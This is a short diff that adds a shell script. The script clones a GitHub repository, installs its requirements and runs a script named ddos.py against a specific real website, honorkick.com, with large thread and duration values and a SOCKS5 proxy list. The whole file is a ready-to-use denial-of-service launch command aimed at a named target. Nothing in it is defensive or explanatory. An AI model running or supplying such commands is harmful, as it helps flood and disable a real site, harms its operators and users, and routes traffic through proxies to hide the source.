@@ -1,0 +1,7 @@
+git clone https://github.com/TryAgainC/xixi.git
+cd xixi
+pip install -r requirements.txt
+
+
+
+python3 ddos.py null https://www.honorkick.com/ 1 30000 socks5.txt 10000 854854
